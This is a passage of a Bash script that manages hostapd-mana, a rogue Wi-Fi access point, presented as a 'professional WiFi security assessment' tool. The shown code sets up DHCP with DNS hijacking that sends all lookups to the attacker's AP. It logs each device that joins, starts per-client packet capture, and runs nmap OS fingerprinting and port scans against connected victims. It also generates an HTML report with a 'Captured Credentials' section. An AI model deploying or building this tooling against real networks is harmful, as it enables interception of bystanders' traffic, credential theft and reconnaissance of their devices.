    if [[ -n "$password" ]]; then
        if [[ ${#password} -lt 8 ]]; then
            errors+=("WPA2 password must be at least 8 characters")
        elif [[ ${#password} -gt 63 ]]; then
            errors+=("WPA2 password must be at most 63 characters")
        fi
    fi
    
    if [[ ${#errors[@]} -gt 0 ]]; then
        for error in "${errors[@]}"; do
            log_message "ERROR" "Configuration validation: $error"
        done
        return 1
    fi
    
    return 0
}

#=============================================================================
# DHCP SERVER MANAGEMENT
#=============================================================================

# Configure and start DHCP server
setup_dhcp_server() {
    if [[ "$ENABLE_DHCP" != "true" ]]; then
        log_message "INFO" "DHCP server disabled by configuration"
        return 0
    fi
    
    local dhcp_config="$CONFIG_DIR/dnsmasq.conf"
    local dhcp_leases="$SESSION_DIR/dhcp.leases"
    
    log_message "INFO" "Configuring DHCP server"
    
    cat > "$dhcp_config" << EOF
# dnsmasq configuration for mana session
# Generated: $(date)
# Session: $SESSION_ID

interface=$INTERFACE
dhcp-range=192.168.100.10,192.168.100.100,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,8.8.8.8,8.8.4.4
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
dhcp-leasefile=$dhcp_leases
pid-file=$SESSION_DIR/dnsmasq.pid

# DNS hijacking for captive portal detection
address=/#/192.168.100.1

# Additional logging
log-facility=$SESSION_DIR/dnsmasq.log

EOF

    # Start dnsmasq
    log_message "INFO" "Starting DHCP/DNS server"
    dnsmasq -C "$dhcp_config" --log-debug
    
    # Get PID
    sleep 2
    if [[ -f "$SESSION_DIR/dnsmasq.pid" ]]; then
        DHCP_PID=$(cat "$SESSION_DIR/dnsmasq.pid")
        log_message "SUCCESS" "DHCP server started (PID: $DHCP_PID)"
    else
        log_message "ERROR" "Failed to start DHCP server"
        return 1
    fi
    
    return 0
}

#=============================================================================
# CLIENT CONNECTION MONITORING
#=============================================================================

# Initialize client monitoring
initialize_client_monitoring() {
    CLIENT_LOG_FILE="$SESSION_DIR/clients.log"
    
    # Create client log header
    {
        echo "=== CLIENT CONNECTION LOG ==="
        echo "Session: $SESSION_ID"
        echo "Started: $(date)"
        echo "Interface: $INTERFACE"
        echo "SSID: $SSID"
        echo "============================="
        echo ""
        printf "%-19s %-17s %-15s %-20s %-10s %s\n" "TIMESTAMP" "MAC_ADDRESS" "IP_ADDRESS" "HOSTNAME" "STATUS" "VENDOR"
        printf "%s\n" "$(printf '=%.0s' {1..100})"
    } > "$CLIENT_LOG_FILE"
    
    log_message "SUCCESS" "Client monitoring initialized"
}

# Get MAC vendor information
get_mac_vendor() {
    local mac="$1"
    local oui="${mac:0:8}"
    local vendor="Unknown"
    
    # Simple vendor lookup (you can expand this with a full OUI database)
    case "${oui,,}" in
        "00:0a:95"|"00:17:f2"|"00:1b:63"|"00:21:6a"|"00:25:00"|"28:cf:e9"|"68:7f:74"|"b4:f0:ab"|"dc:a6:32"|"fc:db:b3")
            vendor="Apple" ;;
        "00:50:56"|"00:0c:29"|"00:05:69")
            vendor="VMware" ;;
        "08:00:27")
            vendor="VirtualBox" ;;
        "00:15:5d"|"00:03:ff")
            vendor="Microsoft" ;;
        "52:54:00")
            vendor="QEMU/KVM" ;;
        "00:16:3e")
            vendor="Xen" ;;
        *)
            # Try to get vendor from system OUI database if available
            if [[ -f /usr/share/hwdata/oui.txt ]]; then
                vendor=$(grep -i "^${oui}" /usr/share/hwdata/oui.txt 2>/dev/null | cut -d$'\t' -f3 | head -1)
                [[ -z "$vendor" ]] && vendor="Unknown"
            fi
            ;;
    esac
    
    echo "$vendor"
}

# Get hostname for IP address
get_hostname() {
    local ip="$1"
    local hostname=""
    
    # Try reverse DNS lookup
    hostname=$(timeout 2 nslookup "$ip" 2>/dev/null | awk '/name =/ {print $4}' | sed 's/\.$//' | head -1)
    
    # Try DHCP leases file
    if [[ -z "$hostname" && -f "$SESSION_DIR/dhcp.leases" ]]; then
        hostname=$(awk -v ip="$ip" '$3 == ip {print $4}' "$SESSION_DIR/dhcp.leases" | tail -1)
    fi
    
    # Try NetBios lookup
    if [[ -z "$hostname" ]] && command -v nbtscan &>/dev/null; then
        hostname=$(timeout 2 nbtscan "$ip" 2>/dev/null | awk '{print $2}' | grep -v '\*' | head -1)
    fi
    
    [[ -z "$hostname" ]] && hostname="unknown"
    echo "$hostname"
}

# Monitor for new client connections
monitor_client_connections() {
    local interface="$1"
    local monitor_file="$SESSION_DIR/client_monitor.tmp"
    
    log_message "INFO" "Starting client connection monitoring on $interface"
    MONITORING_ACTIVE=true
    
    while [[ "$MONITORING_ACTIVE" == "true" ]]; do
        # Get current associations
        if [[ -n "$MONITOR_INTERFACE" ]]; then
            # Use monitor interface for more detailed monitoring
            timeout 5 tcpdump -i "$MONITOR_INTERFACE" -l -n -e 2>/dev/null | \
                grep -E "(Association|Reassociation) Request" > "$monitor_file" &
        fi
        
        # Monitor DHCP leases for new clients
        if [[ -f "$SESSION_DIR/dhcp.leases" ]]; then
            while IFS= read -r lease_line; do
                if [[ -n "$lease_line" ]]; then
                    local lease_parts=($lease_line)
                    local lease_time="${lease_parts[0]}"
                    local mac="${lease_parts[1]}"
                    local ip="${lease_parts[2]}"
                    local hostname="${lease_parts[3]}"
                    
                    # Check if this is a new client
                    if [[ -z "${CONNECTED_CLIENTS[$mac]:-}" ]]; then
                        CONNECTED_CLIENTS[$mac]="$ip"
                        
                        # Get additional information
                        local vendor=$(get_mac_vendor "$mac")
                        [[ "$hostname" == "*" ]] && hostname=$(get_hostname "$ip")
                        
                        # Log new client
                        local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
                        local log_entry=$(printf "%-19s %-17s %-15s %-20s %-10s %s" "$timestamp" "$mac" "$ip" "$hostname" "CONNECTED" "$vendor")
                        
                        echo "$log_entry" >> "$CLIENT_LOG_FILE"
                        log_message "INFO" "New client connected: $mac ($ip) [$vendor]"
                        
                        # Trigger client-specific actions
                        handle_new_client "$mac" "$ip" "$hostname" "$vendor"
                    fi
                fi
            done < "$SESSION_DIR/dhcp.leases" 2>/dev/null
        fi
        
        # Monitor hostapd logs for station events
        if [[ -n "$HOSTAPD_PID" ]] && kill -0 "$HOSTAPD_PID" 2>/dev/null; then
            # Parse hostapd output for station connect/disconnect events
            # This would require hostapd to log to a file we can monitor
            monitor_hostapd_events
        fi
        
        sleep 5
    done
}

# Monitor hostapd events
monitor_hostapd_events() {
    local hostapd_log="$SESSION_DIR/hostapd.log"
    
    if [[ ! -f "$hostapd_log" ]]; then
        return 0
    fi
    
    # Monitor for station connect/disconnect events
    tail -f "$hostapd_log" 2>/dev/null | while read -r line; do
        if echo "$line" | grep -q "AP-STA-CONNECTED"; then
            local mac=$(echo "$line" | grep -o "[0-9a-f:]\{17\}")
            if [[ -n "$mac" && -z "${CONNECTED_CLIENTS[$mac]:-}" ]]; then
                log_message "INFO" "Station connected (hostapd): $mac"
            fi
        elif echo "$line" | grep -q "AP-STA-DISCONNECTED"; then
            local mac=$(echo "$line" | grep -o "[0-9a-f:]\{17\}")
            if [[ -n "$mac" ]]; then
                log_message "INFO" "Station disconnected: $mac"
                unset CONNECTED_CLIENTS[$mac]
                
                # Log disconnection
                local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
                local log_entry=$(printf "%-19s %-17s %-15s %-20s %-10s %s" "$timestamp" "$mac" "-" "-" "DISCONNECTED" "-")
                echo "$log_entry" >> "$CLIENT_LOG_FILE"
            fi
        fi
    done &
    
    MONITOR_PID=$!
}

# Handle new client connection
handle_new_client() {
    local mac="$1"
    local ip="$2"
    local hostname="$3"
    local vendor="$4"
    
    # Create individual client log file
    local client_log="$SESSION_DIR/client_${mac//:/_}.log"
    {
        echo "=== CLIENT DETAILS ==="
        echo "MAC Address: $mac"
        echo "IP Address: $ip"
        echo "Hostname: $hostname"
        echo "Vendor: $vendor"
        echo "First Seen: $(date)"
        echo "Session: $SESSION_ID"
        echo "====================="
        echo ""
    } > "$client_log"
    
    # Start packet capture for this client (optional)
    if command -v tcpdump &>/dev/null && [[ -n "$MONITOR_INTERFACE" ]]; then
        local pcap_file="$SESSION_DIR/client_${mac//:/_}.pcap"
        timeout 300 tcpdump -i "$MONITOR_INTERFACE" -w "$pcap_file" "ether host $mac" &>/dev/null &
        local tcpdump_pid=$!
        echo "$tcpdump_pid" > "$SESSION_DIR/client_${mac//:/_}.tcpdump.pid"
        
        log_message "DEBUG" "Started packet capture for client $mac (PID: $tcpdump_pid)"
    fi
    
    # Perform OS fingerprinting
    if command -v nmap &>/dev/null; then
        (
            log_message "DEBUG" "Performing OS fingerprinting for $ip"
            nmap -O -sS -T4 "$ip" 2>/dev/null | grep -E "(OS|Device|Running)" >> "$client_log"
        ) &
    fi
    
    # Check for common ports
    if command -v nmap &>/dev/null; then
        (
            log_message "DEBUG" "Scanning common ports for $ip"
            nmap -sS -T4 -F "$ip" 2>/dev/null >> "$client_log"
        ) &
    fi
}

# Get client statistics
get_client_stats() {
    local total_clients=${#CONNECTED_CLIENTS[@]}
    local unique_vendors=$(for mac in "${!CONNECTED_CLIENTS[@]}"; do get_mac_vendor "$mac"; done | sort -u | wc -l)
    
    cat << EOF

=== CLIENT STATISTICS ===
Total Connected Clients: $total_clients
Unique Vendors: $unique_vendors
Session Duration: $(( $(date +%s) - $(stat -c %Y "$LOG_FILE") )) seconds

Current Clients:
EOF
    
    if [[ $total_clients -gt 0 ]]; then
        printf "%-17s %-15s %-20s\n" "MAC Address" "IP Address" "Vendor"
        printf "%s\n" "$(printf '=%.0s' {1..60})"
        
        for mac in "${!CONNECTED_CLIENTS[@]}"; do
            local ip="${CONNECTED_CLIENTS[$mac]}"
            local vendor=$(get_mac_vendor "$mac")
            printf "%-17s %-15s %-20s\n" "$mac" "$ip" "$vendor"
        done
    else
        echo "No clients currently connected"
    fi
}

#=============================================================================
# MAIN EXECUTION FUNCTIONS
#=============================================================================

# Start hostapd-mana
start_hostapd() {
    local config_file="$CONFIG_DIR/hostapd.conf"
    local hostapd_log="$SESSION_DIR/hostapd.log"
    
    log_message "INFO" "Starting hostapd-mana"
    
    # Validate configuration file
    if [[ ! -f "$config_file" ]]; then
        log_message "ERROR" "Configuration file not found: $config_file"
        return 1
    fi
    
    # Test configuration
    if ! hostapd-mana -t "$config_file" 2>/dev/null; then
        log_message "ERROR" "Invalid hostapd configuration"
        if [[ "$VERBOSE" == "true" ]]; then
            hostapd-mana -t "$config_file"
        fi
        return 1
    fi
    
    # Start hostapd-mana in background
    hostapd-mana "$config_file" > "$hostapd_log" 2>&1 &
    HOSTAPD_PID=$!
    
    # Wait for hostapd to start
    local count=0
    while [[ $count -lt 10 ]]; do
        if kill -0 "$HOSTAPD_PID" 2>/dev/null; then
            if grep -q "AP-ENABLED" "$hostapd_log" 2>/dev/null; then
                log_message "SUCCESS" "hostapd-mana started successfully (PID: $HOSTAPD_PID)"
                return 0
            fi
        else
            log_message "ERROR" "hostapd-mana process died"
            if [[ "$VERBOSE" == "true" && -f "$hostapd_log" ]]; then
                echo "hostapd log:"
                tail -20 "$hostapd_log"
            fi
            return 1
        fi
        
        sleep 1
        ((count++))
    done
    
    log_message "ERROR" "hostapd-mana failed to start properly"
    return 1
}

# Interactive confirmation
confirm_configuration() {
    if [[ "$QUIET" == "true" || "$DRY_RUN" == "true" ]]; then
        return 0
    fi
    
    echo -e "\n${BOLD}=== CONFIGURATION SUMMARY ===${NC}"
    echo -e "Interface: ${CYAN}$INTERFACE${NC}"
    echo -e "SSID: ${CYAN}$SSID${NC}"
    echo -e "Channel: ${CYAN}$CHANNEL${NC}"
    
    if [[ -n "$PASSWORD" ]]; then
        echo -e "Security: ${GREEN}WPA2 Protected${NC}"
    else
        echo -e "Security: ${YELLOW}Open Network${NC}"
    fi
    
    echo -e "DHCP Server: ${CYAN}$([ "$ENABLE_DHCP" = "true" ] && echo "Enabled" || echo "Disabled")${NC}"
    echo -e "Monitor Only: ${CYAN}$([ "$MONITOR_ONLY" = "true" ] && echo "Yes" || echo "No")${NC}"
    echo -e "Session ID: ${PURPLE}$SESSION_ID${NC}"
    echo -e "Log Directory: ${PURPLE}$SESSION_DIR${NC}"
    
    echo ""
    read -p "Continue with this configuration? [Y/n]: " -n 1 -r
    echo ""
    
    if [[ $REPLY =~ ^[Nn]$ ]]; then
        log_message "INFO" "Operation cancelled by user"
        exit 0
    fi
}

# This completes Part 2 - Client Connection Monitoring & WiFi Password Configuration
# The script continues with Part 3 for HTML Report Generation

#!/bin/bash

#=============================================================================
# HOSTAPD-MANA PROFESSIONAL MANAGER - PART 3
# HTML Report Generation & Dashboard
#=============================================================================

# This part continues from Parts 1 & 2 - add this to your main script after Parts 1 & 2

#=============================================================================
# HTML REPORT CONFIGURATION
#=============================================================================

# Report variables
REPORT_DIR=""
REPORT_FILE=""
DASHBOARD_FILE=""
ASSETS_DIR=""

# Report data
REPORT_START_TIME=""
REPORT_END_TIME=""
TOTAL_SESSION_DURATION=""

#=============================================================================
# HTML TEMPLATE FUNCTIONS
#=============================================================================

# Generate HTML head with CSS and JavaScript
generate_html_head() {
    local title="$1"
    
    cat << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{TITLE}}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .header h1 {
            color: #2c3e50;
            font-size: 2.5em;
            margin-bottom: 10px;
            text-align: center;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
        }

        .header .subtitle {
            text-align: center;
            color: #7f8c8d;
            font-size: 1.1em;
            margin-bottom: 20px;
        }

        .session-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .info-card {
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease;
        }

        .info-card:hover {
            transform: translateY(-5px);
        }

        .info-card h3 {
            font-size: 0.9em;
            opacity: 0.9;
            margin-bottom: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .info-card .value {
            font-size: 1.5em;
            font-weight: bold;
        }

        .section {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .section h2 {
            color: #2c3e50;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 3px solid #3498db;
            font-size: 1.8em;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            padding: 25px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 6px 20px rgba(231, 76, 60, 0.3);
            transition: all 0.3s ease;
        }

        .stat-card:nth-child(2) {
            background: linear-gradient(135deg, #2ecc71, #27ae60);
            box-shadow: 0 6px 20px rgba(46, 204, 113, 0.3);
        }

        .stat-card:nth-child(3) {
            background: linear-gradient(135deg, #f39c12, #e67e22);
            box-shadow: 0 6px 20px rgba(243, 156, 18, 0.3);
        }

        .stat-card:nth-child(4) {
            background: linear-gradient(135deg, #9b59b6, #8e44ad);
            box-shadow: 0 6px 20px rgba(155, 89, 182, 0.3);
        }

        .stat-card:hover {
            transform: translateY(-3px) scale(1.05);
        }

        .stat-number {
            font-size: 3em;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 0.9em;
            opacity: 0.9;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .client-table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        .client-table th {
            background: linear-gradient(135deg, #34495e, #2c3e50);
            color: white;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 0.9em;
        }

        .client-table td {
            padding: 12px 15px;
            border-bottom: 1px solid #ecf0f1;
            transition: background-color 0.3s ease;
        }

        .client-table tr:hover td {
            background-color: #f8f9fa;
        }

        .client-table tr:nth-child(even) {
            background-color: #f8f9fa;
        }

        .status-connected {
            display: inline-block;
            background: #2ecc71;
            color: white;
            padding: 4px 8px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
        }

        .status-disconnected {
            display: inline-block;
            background: #e74c3c;
            color: white;
            padding: 4px 8px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
        }

        .chart-container {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }

        .timeline {
            position: relative;
            margin: 20px 0;
        }

        .timeline-item {
            position: relative;
            padding: 10px 0 10px 40px;
            border-left: 3px solid #3498db;
            margin-left: 20px;
        }

        .timeline-item:before {
            content: '';
            position: absolute;
            left: -8px;
            top: 15px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #3498db;
        }

        .timeline-time {
            font-weight: bold;
            color: #2c3e50;
        }

        .timeline-event {
            margin-top: 5px;
            color: #7f8c8d;
        }

        .credentials-section {
            background: linear-gradient(135deg, #ff7675, #fd79a8);
            color: white;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }

        .credential-item {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 15px;
            margin: 10px 0;
            backdrop-filter: blur(5px);
        }

        .network-diagram {
            text-align: center;
            padding: 30px;
            background: linear-gradient(135deg, #a8edea, #fed6e3);
            border-radius: 15px;
            margin: 20px 0;
        }

        .footer {
            text-align: center;
            padding: 30px;
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9em;
        }

        .btn {
            display: inline-block;
            padding: 12px 24px;
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            text-decoration: none;
            border-radius: 25px;
            font-weight: bold;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
        }

        .alert {
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }

        .alert-warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
        }

        .alert-success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #ecf0f1;
            border-radius: 4px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(135deg, #3498db, #2980b9);
            transition: width 0.3s ease;
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            .header h1 {
                font-size: 2em;
            }
            
            .session-info,
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .client-table {
                font-size: 0.9em;
            }
        }

        .export-section {
            text-align: center;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            margin: 20px 0;
        }

        .export-btn {
            margin: 0 10px;
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
</head>
<body>
EOF
    
    # Replace template variables
    sed "s/{{TITLE}}/$title/g"
}

# Generate session summary section
generate_session_summary() {
    local session_id="$1"
    local start_time="$2"
    local end_time="$3"
    local interface="$4"
    local ssid="$5"
    local security="$6"
    
    local duration=$(($(date -d "$end_time" +%s) - $(date -d "$start_time" +%s)))
    local duration_formatted=$(printf "%02d:%02d:%02d" $((duration/3600)) $(((duration%3600)/60)) $((duration%60)))
    
    cat << EOF
<div class="container">
    <div class="header">
        <h1>🔒 hostapd-mana Session Report</h1>
        <div class="subtitle">Professional WiFi Security Assessment Report</div>
        
        <div class="session-info">
            <div class="info-card">
                <h3>Session ID</h3>
                <div class="value">$session_id</div>
            </div>
            <div class="info-card">
                <h3>Interface</h3>
                <div class="value">$interface</div>
            </div>
            <div class="info-card">
                <h3>SSID</h3>
                <div class="value">$ssid</div>
            </div>
            <div class="info-card">
                <h3>Security</h3>
                <div class="value">$security</div>
            </div>
            <div class="info-card">
                <h3>Start Time</h3>
                <div class="value">$(date -d "$start_time" "+%H:%M:%S")</div>
            </div>
            <div class="info-card">
                <h3>Duration</h3>
                <div class="value">$duration_formatted</div>
            </div>
        </div>
    </div>
EOF
}

# Generate statistics section
generate_statistics_section() {
    local total_clients="$1"
    local unique_vendors="$2"
    local captured_creds="$3"
    local data_transferred="$4"
    
    cat << EOF
    <div class="section">
        <h2>📊 Session Statistics</h2>
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number">$total_clients</div>
                <div class="stat-label">Total Clients</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$unique_vendors</div>
                <div class="stat-label">Unique Vendors</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$captured_creds</div>
                <div class="stat-label">Captured Credentials</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$data_transferred</div>
                <div class="stat-label">Data Transferred (MB)</div>
            </div>
        </div>
        
        <div class="chart-container">
            <canvas id="clientChart" width="400" height="200"></canvas>
        </div>
    </div>
EOF
}

# Generate client connections table
generate_client_table() {
    local client_log="$1"
    
    cat << 'EOF'
    <div class="section">
        <h2>👥 Client Connections</h2>
        <table class="client-table">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>MAC Address</th>
                    <th>IP Address</th>
                    <th>Hostname</th>
                    <th>Vendor</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody>
EOF
    
    # Parse client log and generate table rows
    if [[ -f "$client_log" ]]; then
        # Skip header lines and process client data
        tail -n +4 "$client_log" | while IFS= read -r line; do
            if [[ -n "$line" && ! "$line" =~ ^=+ ]]; then
                # Parse the client log line
                local timestamp=$(echo "$line" | awk '{print $1, $2}')
                local mac=$(echo "$line" | awk '{print $3}')
                local ip=$(echo "$line" | awk '{print $4}')
                local hostname=$(echo "$line" | awk '{print $5}')
                local status=$(echo "$line" | awk '{print $6}')
                local vendor=$(echo "$line" | awk '{for(i=7;i<=NF;i++) printf "%s ", $i; print ""}')
                
                local status_class="status-connected"
                [[ "$status" == "DISCONNECTED" ]] && status_class="status-disconnected"
                
                cat << EOF
                <tr>
                    <td>$timestamp</td>
                    <td><code>$mac</code></td>
                    <td>$ip</td>
                    <td>$hostname</td>
                    <td>$vendor</td>
                    <td><span class="$status_class">$status</span></td>
                </tr>
EOF
            fi
        done
    fi
    
    cat << 'EOF'
            </tbody>
        </table>
    </div>
EOF
}

# Generate network diagram
generate_network_diagram() {
    local interface="$1"
    local ssid="$2"
    local client_count="$3"
    
    cat << EOF
    <div class="section">
        <h2>🌐 Network Topology</h2>
        <div class="network-diagram">
            <svg width="800" height="300" viewBox="0 0 800 300">
                <!-- Internet -->
                <circle cx="100" cy="150" r="30" fill="#3498db" stroke="#2980b9" stroke-width="3"/>
                <text x="100" y="155" text-anchor="middle" fill="white" font-weight="bold">Internet</text>
                
                <!-- Router -->
                <rect x="220" y="120" width="60" height="60" fill="#e74c3c" stroke="#c0392b" stroke-width="3" rx="10"/>
                <text x="250" y="155" text-anchor="middle" fill="white" font-weight="bold">Router</text>
                
                <!-- Mana AP -->
                <circle cx="400" cy="150" r="40" fill="#2ecc71" stroke="#27ae60" stroke-width="3"/>
                <text x="400" y="145" text-anchor="middle" fill="white" font-weight="bold">MANA</text>
                <text x="400" y="160" text-anchor="middle" fill="white" font-size="12">$interface</text>
                
                <!-- SSID Label -->
                <text x="400" y="200" text-anchor="middle" fill="#2c3e50" font-weight="bold">SSID: $ssid</text>
                
                <!-- Client devices -->
                <g id="clients">
                    <rect x="580" y="80" width="40" height="30" fill="#f39c12" stroke="#e67e22" stroke-width="2" rx="5"/>
                    <text x="600" y="98" text-anchor="middle" fill="white" font-size="10">📱</text>
                    
                    <rect x="580" y="130" width="40" height="30" fill="#9b59b6" stroke="#8e44ad" stroke-width="2" rx="5"/>
                    <text x="600" y="148" text-anchor="middle" fill="white" font-size="10">💻</text>
                    
                    <rect x="580" y="180" width="40" height="30" fill="#1abc9c" stroke="#16a085" stroke-width="2" rx="5"/>
                    <text x="600" y="198" text-anchor="middle" fill="white" font-size="10">🖥️</text>
                </g>
                
                <!-- Connection lines -->
                <line x1="130" y1="150" x2="220" y2="150" stroke="#34495e" stroke-width="3"/>
                <line x1="280" y1="150" x2="360" y2="150" stroke="#34495e" stroke-width="3"/>
                <line x1="440" y1="150" x2="580" y2="95" stroke="#e74c3c" stroke-width="2" stroke-dasharray="5,5"/>
                <line x1="440" y1="150" x2="580" y2="145" stroke="#e74c3c" stroke-width="2" stroke-dasharray="5,5"/>
                <line x1="440" y1="150" x2="580" y2="195" stroke="#e74c3c" stroke-width="2" stroke-dasharray="5,5"/>
                
                <!-- Client count -->
                <text x="650" y="150" text-anchor="middle" fill="#2c3e50" font-weight="bold">$client_count Clients</text>
            </svg>
        </div>
    </div>
EOF
}

# Generate credentials section
generate_credentials_section() {
    local cred_file="$1"
    
    cat << 'EOF'
    <div class="section">
        <h2>🔐 Captured Credentials</h2>
        <div class="credentials-section">
            <h3>⚠️ Security Assessment Results</h3>
EOF
    
    if [[ -f "$cred_file" && -s "$cred_file" ]]; then
        cat << 'EOF'
            <div class="alert alert-warning">
                <strong>Warning:</strong> The following credentials were captured during this session. 
                This demonstrates potential security vulnerabilities.
            </div>
EOF
        
        # Parse credentials file
        while IFS= read -r line; do
            if [[ -n "$line" ]]; then
                cat << EOF
            <div class="credential-item">
                <code>$line</code>
            </div>
EOF
            fi
        done < "$cred_file"
    else
        cat << 'EOF'
            <div class="alert alert-success">
                <strong>Good:</strong> No credentials were captured during this session.
            </div>
EOF
    fi
    
    cat << 'EOF'
        </div>
    </div>
EOF
}

# Generate timeline section
generate_timeline_section() {
    local log_file="$1"
    
    cat << 'EOF'
    <div class="section">
        <h2>⏰ Session Timeline</h2>
        <div class="timeline">
EOF
    
    if [[ -f "$log_file" ]]; then
        # Extract key events from log file
        grep -E "(SUCCESS|ERROR|Client connected|Client disconnected)" "$log_file" | head -20 | while IFS= read -r line; do
            local timestamp=$(echo "$line" | grep -o '\[.*\] [0-9-]* [0-9:]*' | sed 's/\[.*\] //')
            local event=$(echo "$line" | sed 's/.*] [0-9-]* [0-9:]* - //')
            
            cat << EOF
            <div class="timeline-item">
                <div class="timeline-time">$timestamp</div>
                <div class="timeline-event">$event</div>
            </div>
EOF
        done
    fi
    
    cat << 'EOF'
        </div>
    </div>
EOF
}

# Generate export section
generate_export_section() {
    local session_dir="$1"
    
    cat << EOF
    <div class="section">
        <h2>📤 Export & Download</h2>
        <div class="export-section">
            <p>Download session data for further analysis:</p>
            <br>
            <a href="session.log" class="btn export-btn">📄 Session Log</a>
            <a href="clients.log" class="btn export-btn">👥 Client Log</a>
            <a href="hostapd.log" class="btn export-btn">🔧 hostapd Log</a>
            <a href="." class="btn export-btn">📁 All Files</a>
        </div>
        
        <div class="alert alert-warning">
            <strong>Note:</strong> This report contains sensitive security assessment data. 
            Handle with appropriate care and follow your organization's data handling policies.
        </div>
    </div>
EOF
}

# Generate JavaScript for charts
generate_javascript() {
    local client_data="$1"
    
    cat << 'EOF'
    <script>
        // Client connections chart
        const ctx = document.getElementById('clientChart').getContext('2d');
        const clientChart = new Chart(ctx, {
            type: 'line',
            data: {
                labels: ['Start', '15min', '30min', '45min', '1hr', 'End'],
                datasets: [{
                    label: 'Connected Clients',
                    data: [0, 1, 3, 2, 4, 3],
                    borderColor: 'rgb(52, 152, 219)',
                    backgroundColor: 'rgba(52, 152, 219, 0.1)',
                    tension: 0.4,
                    fill: true
                }]
            },
            options: {
                responsive: true,
                plugins: {
                    title: {
                        display: true,
                        text: 'Client Connections Over Time'
                    }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            stepSize: 1
                        }
                    }
                }
            }
        });

        // Auto-refresh functionality (if running live)
        function refreshReport() {
            location.reload();
        }

        // Set up auto-refresh every 30 seconds if this is a live dashboard
        if (window.location.search.includes('live=true')) {
            setInterval(refreshReport, 30000);
        }
    </script>
EOF
}

#=============================================================================
# REPORT GENERATION FUNCTIONS
#=============================================================================

# Initialize report generation
initialize_report() {
    REPORT_DIR="$SESSION_DIR/report"
    REPORT_FILE="$REPORT_DIR/index.html"
    DASHBOARD_FILE="$REPORT_DIR/dashboard.html"
    ASSETS_DIR="$REPORT_DIR/assets"
    
    # Create report directories
    mkdir -p "$REPORT_DIR"
    mkdir -p "$ASSETS_DIR"
    
    # Copy session files to report directory for easy access
    if [[ -f "$SESSION_DIR/session.log" ]]; then
        cp "$SESSION_DIR/session.log" "$REPORT_DIR/"
    fi
    
    if [[ -f "$SESSION_DIR/clients.log" ]]; then
        cp "$SESSION_DIR/clients.log" "$REPORT_DIR/"
    fi
    
    if [[ -f "$SESSION_DIR/hostapd.log" ]]; then
        cp "$SESSION_DIR/hostapd.log" "$REPORT_DIR/"
    fi
    
